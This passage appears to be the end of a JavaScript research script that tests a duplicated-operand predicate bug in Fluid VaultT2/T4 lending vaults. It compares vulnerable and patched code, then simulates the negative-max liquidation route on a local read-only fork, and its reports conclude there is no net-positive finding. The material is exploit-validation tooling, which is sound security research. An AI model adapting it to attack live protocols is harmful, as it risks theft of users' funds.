    out.negativeMaxCall = { ok: false, revertData: neg.revertData || null, revertDecoded: decodeRevert(neg.revertData) };
    out.verdict = "INCONCLUSIVE_NEGATIVE_MAX_NOT_ACCEPTED_ON_LIVE_ROW";
    return out;
  }
  const n0 = BigInt(IFACE.vault.decodeFunctionResult("operatePerfect", neg.result)[1][1]);
  const n1 = BigInt(IFACE.vault.decodeFunctionResult("operatePerfect", neg.result)[1][2]);
  out.negativeMaxCall = { ok: true, token0: n0.toString(), token1: n1.toString() };
  const extraToken1 = n1 - q1;
  out.accounting = {
    honestQuoteToken0: q0.toString(), honestQuoteToken1: q1.toString(),
    negativeMaxToken0: n0.toString(), negativeMaxToken1: n1.toString(),
    extraToken1VsHonestQuote: extraToken1.toString(),
    callerFunded: true,
    netCallerGain: "0 (caller funds every supplied unit; the collateral share credit accrues to the caller's own NFT)",
    beneficiary: EOA,
    outsiderPnl: "0",
  };
  out.verdict = "FAIL_CLOSED_CALLER_FUNDED_NO_NET_POSITIVE";
  return out;
}

// ---------------------------------------------------------------------------
// main
// ---------------------------------------------------------------------------
async function run() {
  if (!fs.existsSync(ANVIL)) fail("ANVIL_MISSING");
  const artifacts = {
    schema: "fluid-t2negmax-differential-r1/v1",
    generatedAt: new Date().toISOString(),
    chainId: CHAIN_ID_DEFAULT,
    scanner: "tools/fluid-t2negmax-differential-r1.js",
    scope: "Fluid VaultT2/T4 duplicated-operand negative-max predicate differential (compile + fresh-finalized-fork)",
    safety: {
      readOnly: true, signedActions: false, privateKeysRead: false, endpointMaterialLogged: false,
      forkLocalImpersonationOnly: true, upstreamForwarding: false,
    },
    relayOnly: true, endpointProcessOnly: true, endpointSource: "rpc_endpoints.txt", endpointMaterialLogged: false,
    readonly: true,
    routePositive: false, executableNow: false, signedActionJustified: false,
    stages: {},
  };
  process.stdout.write("endpoint: rpc_endpoints.txt, path-only\n");

  const runStage = async (name, fn) => {
    try { artifacts.stages[name] = { stage: name, ...(await fn()) }; }
    catch (e) {
      const reason = e?.code && CODES.has(e.code) ? e.code : `${stage}_INTERNAL_OR_RELAY_FAILURE`;
      if (reason === "DEADLINE_EXCEEDED") throw e;
      artifacts.stages[name] = { stage: name, verdict: "FAIL_CLOSED", reason };
    }
  };

  stage = "A";
  await runStage("a_predicate_diff", async () => stagePredicateDiff());
  const pred = artifacts.stages.a_predicate_diff;
  const predicateDivergent = pred.verdict === "PASS_DIVERGENCE_CONFIRMED";

  stage = "B";
  await runStage("b_forge_differential", async () => stageForgeDifferential());
  const divergenceReached = artifacts.stages.b_forge_differential.divergenceReached === true;

  stage = "C";
  let rows = null;
  await runStage("c_live_fork", async () => {
    rows = selectRows();
    artifacts.rowSelection = { nearLt: rows.nearLt, healthy: rows.healthy, exploit: rows.exploit, exploitSelection: rows.exploitSelection, exploitCandidates: rows.exploitCandidates, exploitSubstituted: rows.exploitSubstituted, scanHead: rows.scanHead, scannedAt: rows.scannedAt, chainLabel: rows.chainLabel, totalT2NegMaxInScan: rows.totalT2NegMax };
    const addrs = [rows.nearLt.vault, rows.healthy.vault, FACTORY_CHAIN1];
    return forkSession(1, addrs, "c", (local, backing) => stageLiveFork(local, backing, [rows.nearLt, rows.healthy]));
  });

  stage = "D";
  await runStage("d_exploit_simulation", async () => {
    if (!divergenceReached) return { stage: "d_exploit_simulation", verdict: "NOT_APPLICABLE_PREDICATE_EQUIVALENT", reason: "stage b found no concrete divergence" };
    if (!rows) return { stage: "d_exploit_simulation", verdict: "FAIL_CLOSED", reason: "NO_LIVE_ROW_SELECTED" };
    const target = rows.exploit || rows.nearLt;
    // qualify() requires every address to carry code; the native-ETH sentinel never does, so it is
    // excluded from the fork-qualification list (stageExploit still handles it as a token).
    const addrs = [target.vault, target.supplyToken0, target.supplyToken1].filter((a) => a && !isNativeSupply(a));
    return forkSession(1, addrs, "d", (local, backing) => stageExploit(local, backing, target, rows.exploitCandidates));
  });

  // attach the fresh stage-d per-candidate selector checks + chosen pin to rowSelection
  if (artifacts.rowSelection) {
    const dstage = artifacts.stages.d_exploit_simulation || {};
    artifacts.rowSelection.exploitSelectorChecks = dstage.candidateSelectorChecks || [];
    artifacts.rowSelection.exploitPin = dstage.pin != null ? dstage.pin : (dstage.fork ? dstage.fork.pin : null);
    artifacts.rowSelection.exploitPinHash = dstage.pinHash || (dstage.fork ? dstage.fork.pinHash : null);
  }

  const s = artifacts.stages;
  const bVerdict = s.b_forge_differential.verdict;
  const cVerdict = s.c_live_fork.verdict;
  const dVerdict = s.d_exploit_simulation.verdict;
  const cPass = String(cVerdict || "").startsWith("PASS");
  const dClosed = String(dVerdict || "").startsWith("FAIL_CLOSED") || String(dVerdict).startsWith("NOT_APPLICABLE");
  const dDataDependent = String(dVerdict || "").startsWith("FAIL_CLOSED_DATA_DEPENDENT_TOKEN_REJECTION");
  if (!predicateDivergent) artifacts.overallVerdict = "PASS_PREDICATE_EQUIVALENT";
  else if (bVerdict === "PASS_DIVERGENCE_CONFIRMED" && cPass && dClosed) artifacts.overallVerdict = dDataDependent ? "PASS_ROUTE_NEGATIVE_DATA_DEPENDENT_TOKEN_REJECTION" : "PASS_ROUTE_NEGATIVE_CALLER_FUNDED";
  else if ([bVerdict, cVerdict].some((v) => String(v).startsWith("INCONCLUSIVE")) || String(dVerdict).startsWith("INCONCLUSIVE")) artifacts.overallVerdict = "INCONCLUSIVE_PARTIAL";
  else artifacts.overallVerdict = "FAIL_CLOSED";

  const exploitSel = artifacts.rowSelection && artifacts.rowSelection.exploitSelection;
  const dAccounting = artifacts.stages.d_exploit_simulation.accounting || {};
  const exploitRowLabel = exploitSel ? `${exploitSel.supplyToken0Label}/${exploitSel.supplyToken1Label} (${exploitSel.vault})` : "the fresh plain-transfer near/at-LT row";
  const extraToken1 = dAccounting.extraToken1VsHonestQuote != null ? dAccounting.extraToken1VsHonestQuote : "0";
  const selectorChecks = artifacts.stages.d_exploit_simulation.candidateSelectorChecks || [];
  const anySafeTransferRevert = selectorChecks.some((c) => c.selectorObserved === "0xdee51a8a");
  artifacts.noFinding = artifacts.overallVerdict.startsWith("PASS")
    ? (dDataDependent
      ? `No finding: the duplicated-operand predicate differential is real (vulnerable accepts a non-positive token1 maximum where patched rejects), but on the fresh plain-transfer substitute row ${exploitRowLabel} the honest baseline quote itself reverts at the ERC20 safe-transfer layer (FluidSafeTransferError 0xdee51a8a) for token data-dependent reasons, so no unowned net-positive seize beyond the honest maxLiquidationPenalty is measurable and no differential can be attributed to the predicate; routePositive=false, executableNow=false, signedActionJustified=false.`
      : predicateDivergent
        ? `No finding: the duplicated-operand predicate differential is real (vulnerable accepts a non-positive token1 maximum where patched rejects), but on the fresh plain-transfer near/at-LT substitute row ${exploitRowLabel} the honest baseline quote passes and the negative-max (-1) call is accepted with extra token1 vs the honest quote = ${extraToken1}; every affected unit is caller-funded and credited back to the caller's own NFT, so there is no unowned net-positive seize beyond the honest maxLiquidationPenalty. The plain-transfer candidate screen (native, staticAToken/stata*, sUSDS/sUSDe savings and rebasing classes excluded) observed ${anySafeTransferRevert ? "a token-level FluidSafeTransferError (0xdee51a8a) baseline revert on at least one candidate" : "no token-level FluidSafeTransferError (0xdee51a8a) baseline revert"}, so the differential is predicate-only and the route is negative. routePositive=false, executableNow=false, signedActionJustified=false.`
        : "No finding: the pinned predicate expressions are equivalent across the target and patched trees; the T2/T4 negative-max route is predicate-equivalent and therefore route-negative.")
    : "No finding is asserted: at least one stage failed closed or was inconclusive; the negative-max route remains unresolved, not confirmed.";
  artifacts.completedAt = new Date().toISOString();
  return artifacts;
}

function humanReport(a) {
  const p = a.stages.a_predicate_diff || {};
  const b = a.stages.b_forge_differential || {};
  const c = a.stages.c_live_fork || {};
  const d = a.stages.d_exploit_simulation || {};
  const L = [];
  L.push("# Fluid VaultT2/T4 Negative-Max Predicate Differential — R1");
  L.push("");
  L.push(`**Verdict: ${a.overallVerdict}**`);
  L.push("");
  L.push(`- Generated: ${a.generatedAt} → ${a.completedAt}`);
  L.push(`- Chain: ${a.chainId}; read-only, fork-local impersonation only; no endpoint material persisted.`);
  L.push(`- routePositive: **${a.routePositive}** · executableNow: **${a.executableNow}** · signedActionJustified: **${a.signedActionJustified}**`);
  L.push("");
  L.push(a.noFinding);
  L.push("");
  L.push("## a) Predicate differential");
  L.push("");
  for (const d0 of p.divergences || []) {
    L.push(`### ${d0.type} ${d0.divergent ? "(DIVERGENT)" : "(equivalent)"}`);
    L.push("");
    L.push(`- Target (vulnerable): \`${d0.vulnerableExpr}\` — ${d0.targetFileLine}`);
    L.push(`- Patched: \`${d0.patchedExpr}\` — ${d0.patchedFileLine}`);
    L.push(`- Duplicated operand in the target: \`${d0.duplicatedOperand}\` (intended second operand: \`${d0.intendedOperand}\`).`);
  }
  L.push("");
  L.push("| Tree | File | Line | sha256 | Predicate | Class |");
  L.push("|---|---|---:|---|---|---|");
  for (const [k, t] of Object.entries(p.trees || {})) {
    for (const type of ["T2", "T4"]) {
      const r = t.types[type];
      if (!r) continue;
      L.push(`| ${k} | ${r.file} | ${r.line} | \`${String(r.fileSha256 || "").slice(0, 16)}…\` | \`${r.predicateExpr || r.error}\` | ${r.classification || r.error} |`);
    }
  }
  L.push("");
  L.push(`- target equals remediation-vulnerable (both types): ${p.remediationConsistency ? p.remediationConsistency.targetEqualsRemediationVulnerable : "n/a"}`);
  L.push("");
  L.push("## b) Forge differential");
  L.push("");
  L.push(`- Verdict: **${b.verdict || "n/a"}**; derived harness: ${b.derivedHarness ? b.derivedHarness.path : "n/a"} (forge status ${b.derivedHarness ? b.derivedHarness.forgeStatus : "n/a"}).`);
  if (b.derivedHarness) {
    L.push(`- Boundary pairs with vulnerable≠patched: ${b.derivedHarness.divergentPairCount}; fuzz shape violations: ${b.derivedHarness.fuzzShapeViolations}.`);
    if (b.derivedHarness.witness) {
      const w = b.derivedHarness.witness;
      L.push(`- **Witness:** colToken0MinMax=${w.colToken0MinMax}, colToken1MinMax=${w.colToken1MinMax} → vulnerable accepts=${w.vulnerableAccepts}, patched accepts=${w.patchedAccepts}; uint(int256(-1)) == 2^256-1 = ${w.vulnCastT1MinIsUintMax}.`);
    }
  }
  const th = b.treeHarnessCorroboration || {};
  L.push("");
  L.push("| Tree harness (tree's own contracts) | State | passed | failed |");
  L.push("|---|---|---:|---:|");
  for (const k of ["vulnerable", "patched"]) {
    const h = th[k];
    if (!h) continue;
    L.push(`| ${k} | ${h.state} | ${h.passedTests ?? "?"} | ${h.failedTests ?? "?"} |`);
  }
  if (th.vulnerable && th.vulnerable.logs) {
    const v = th.vulnerable.logs;
    const keys = ["VULNERABLE_T2_NEGATIVE_TOKEN1_CONSUMED", "VULNERABLE_T4_NEGATIVE_TOKEN1_CONSUMED", "T2_PRE_SHIFT_TOKEN1_QUOTE", "T2_POST_SHIFT_TOKEN1_CONSUMED", "T2_RESERVE_SHIFT_EXTRA_TOKEN1", "T4_PRE_SHIFT_TOKEN1_QUOTE", "T4_POST_SHIFT_TOKEN1_CONSUMED", "T4_RESERVE_SHIFT_EXTRA_TOKEN1"].filter((x) => v[x] !== undefined);
    if (keys.length) L.push(`- Vulnerable-tree harness logs: ${keys.map((x) => `${x}=${v[x]}`).join(", ")}.`);
  }
  if (th.patched && th.patched.logs) {
    const v = th.patched.logs;
    const keys = ["PATCHED_T2_DEPOSIT_TOKEN1_EXACT", "PATCHED_T4_DEPOSIT_TOKEN1_EXACT", "PATCHED_T2_PRE_SHIFT_TOKEN1_MAX", "PATCHED_T2_POST_SHIFT_TOKEN1_EXACT"].filter((x) => v[x] !== undefined);
    if (keys.length) L.push(`- Patched-tree harness logs: ${keys.map((x) => `${x}=${v[x]}`).join(", ")}.`);
  }
  L.push("");
  L.push("## c) Live-fork entry check");
  L.push("");
  if (a.rowSelection) {
    L.push(`- Fresh finalized pin: ${c.fork ? c.fork.pin : "?"} (${c.fork ? c.fork.pinHash : "?"}).`);
    L.push(`- Row selection: near/at-LT negative-max \`${a.rowSelection.nearLt.vault}\` (${a.rowSelection.nearLt.ltReadiness}, LTV ${a.rowSelection.nearLt.aggregateLtvBps}bps / LT ${a.rowSelection.nearLt.liquidationThresholdBps}bps); healthy same-type \`${a.rowSelection.healthy.vault}\` (${a.rowSelection.healthy.ltReadiness}, LTV ${a.rowSelection.healthy.aggregateLtvBps}bps / LT ${a.rowSelection.healthy.liquidationThresholdBps}bps).`);
    L.push(`- Source scan: ${a.rowSelection.scannedAt}; scan head ${a.rowSelection.scanHead ? a.rowSelection.scanHead.number : "?"}.`);
  }
  L.push("");
  L.push("| Role | Vault | Code | EIP1967 | impl bound | liquidate() | decoded |");
  L.push("|---|---|---|---|---|---|---|");
  for (const r of c.rows || []) {
    const dec = r.liquidateCall && r.liquidateCall.revertDecoded ? JSON.stringify(r.liquidateCall.revertDecoded) : (r.liquidateCall && r.liquidateCall.reverted ? "reverted" : "returned");
    L.push(`| ${r.role} | ${r.vault} | ${r.vaultCodePresent} | ${r.eip1967Class} | ${r.isVaultDeploymentLogic} | ${r.liquidateCall ? (r.liquidateCall.reverted ? "REVERT" : "OK") : "?"} | ${String(dec).replace(/\|/g, "/")} |`);
  }
  L.push("");
  L.push(`- Checks: ${JSON.stringify(c.checks || {})}`);
  L.push("");
  L.push("## d) Bounded exploit simulation");
  L.push("");
  L.push(`- Verdict: **${d.verdict || "n/a"}**${d.reason ? ` (${d.reason})` : ""}`);
  if (a.rowSelection && a.rowSelection.exploitSelection) {
    const es = a.rowSelection.exploitSelection;
    L.push(`- Selection: chosen near/at-LT substitute \`${es.vault}\` (${es.supplyToken0Label}/${es.supplyToken1Label})${es.accepted ? `; ${es.reason}` : `; ${es.reason}`}`);
  }
  if (a.rowSelection && a.rowSelection.exploit && d.vault) L.push(`- Exploit row: \`${d.vault}\` (pin ${d.pin ?? (d.fork && d.fork.pin) ?? "?"})${a.rowSelection.exploitSubstituted ? " — a plain-transfer near/at-LT substitute for the native-supply row so the fork is storage-fundable" : ""}.`);
  const dChecks = d.candidateSelectorChecks || [];
  if (dChecks.length) {
    L.push("");
    L.push(`- Per-candidate selector check (fresh fork, staticCall honest baseline; pin ${d.pin ?? "?"}):`);
    L.push("");
    L.push("| Candidate vault | LT | supply pair | class | funded | plain xfer t1 | baseline quote | selector | pin |");
    L.push("|---|---|---|---|---|---|---|---|---|");
    for (const r of dChecks) {
      const bq = r.baselineQuote ? (r.baselineQuote.ok ? "OK" : `REVERT${r.baselineQuote.revertDecoded ? ` ${r.baselineQuote.revertDecoded.name || r.baselineQuote.revertDecoded.selector}` : ""}`) : (r.selectorCheck || "n/a");
      const pt = r.plainTransferToken1 ? (r.plainTransferToken1.ok ? "1:1" : `Δ${r.plainTransferToken1.moved}`) : "n/a";
      const funded = r.acceptedByClass ? `${r.fundedToken0 ? "y" : "n"}/${r.fundedToken1 ? "y" : "n"}` : "—";
      L.push(`| ${r.vault}${r.isChosenRow ? " *(chosen)*" : ""} | ${r.ltReadiness || "?"} | ${r.supplyToken0Label || ""}/${r.supplyToken1Label || ""} | ${r.token0Class || "?"}/${r.token1Class || "?"} | ${funded} | ${pt} | ${bq} | ${r.selectorObserved || "—"} | ${r.pin ?? "?"} |`);
    }
  }
  if (a.rowSelection && Array.isArray(a.rowSelection.exploitCandidates) && a.rowSelection.exploitCandidates.length) {
    L.push("");
    L.push("- Candidate accept/reject (`rowSelection.exploitCandidates`):");
    for (const cand of a.rowSelection.exploitCandidates) {
      L.push(`  - \`${cand.vault}\` ${cand.supplyToken0Label}/${cand.supplyToken1Label} (${cand.ltReadiness || "?"}): ${cand.reason}`);
    }
  }
  if (d.quote) L.push(`- Honest positive-max quote: token0=${d.quote.token0 ?? "?"}, token1=${d.quote.token1 ?? "?"} (pin ${d.pin ?? (d.fork && d.fork.pin) ?? "?"}).`);
  if (d.negativeMaxCall && d.negativeMaxCall.ok) L.push(`- Negative-max (-1) call accepted on the live vault: token0=${d.negativeMaxCall.token0}, token1=${d.negativeMaxCall.token1}.`);
  if (d.accounting) L.push(`- Extra token1 vs honest quote: ${d.accounting.extraToken1VsHonestQuote}; callerFunded=${d.accounting.callerFunded}; outsiderPnl=${d.accounting.outsiderPnl}.`);
  L.push("");
  L.push("## Verdict & gates");
  L.push("");
  L.push(`- Overall: **${a.overallVerdict}**`);
  L.push(`- routePositive=${a.routePositive}, executableNow=${a.executableNow}, signedActionJustified=${a.signedActionJustified}`);
  L.push("");
  return L.join("\n") + "\n";
}

process.once("exit", stopAnvil);
for (const signal of ["SIGINT", "SIGTERM"]) process.once(signal, () => { aborted = true; stopAnvil(); process.exit(1); });

(async () => {
  const timer = setTimeout(() => { aborted = true; stopAnvil(); }, LIMIT_MS);
  HARD_DEADLINE = deadline();
  let raceTimer = null;
  try {
    const result = await Promise.race([
      run(),
      new Promise((_, reject) => { raceTimer = setTimeout(() => reject(new Error("DEADLINE_EXCEEDED")), LIMIT_MS); }),
    ]);
    fs.mkdirSync(OUTDIR, { recursive: true });
    fs.writeFileSync(OUTPUT, JSON.stringify(result, null, 2) + "\n", "utf8");
    fs.writeFileSync(REPORT, humanReport(result), "utf8");
    process.stdout.write(JSON.stringify({
      overallVerdict: result.overallVerdict, routePositive: result.routePositive, executableNow: result.executableNow,
      signedActionJustified: result.signedActionJustified,
      stages: Object.fromEntries(Object.entries(result.stages).map(([k, v]) => [k, (v && v.verdict) || null])),
      cleanup: stopAnvil() ? "clean" : "residual",
    }) + "\n");
  } catch (error) {
    const reason = CODES.has(error?.message) ? error.message : `${stage}_INTERNAL_OR_RELAY_FAILURE`;
    if (process.env.FLUID_T2NEGMAX_DEBUG === "1" && !CODES.has(error?.message)) process.stderr.write(`[debug] ${error && error.stack ? error.stack : String(error)}\n`);
    const closed = {
      schema: "fluid-t2negmax-differential-r1/v1", state: "FAIL_CLOSED", reason,
      generatedAt: new Date().toISOString(), chainId: CHAIN_ID_DEFAULT,
      relayOnly: true, endpointProcessOnly: true, endpointSource: "rpc_endpoints.txt", endpointMaterialLogged: false,
      readonly: true, routePositive: false, executableNow: false, signedActionJustified: false,
      noFinding: "No finding is asserted: the run failed closed; the negative-max route remains unresolved, not confirmed.",
      completedAt: new Date().toISOString(),
    };
    fs.mkdirSync(OUTDIR, { recursive: true });
    fs.writeFileSync(OUTPUT, JSON.stringify(closed, null, 2) + "\n", "utf8");
    fs.writeFileSync(REPORT, humanReport({ ...closed, stages: {} }), "utf8");
    process.stdout.write(JSON.stringify({ state: "FAIL_CLOSED", reason }) + "\n");
    process.exitCode = 1;
  } finally {
    clearTimeout(timer);
    if (raceTimer) clearTimeout(raceTimer);
    stopAnvil();
  }
})();
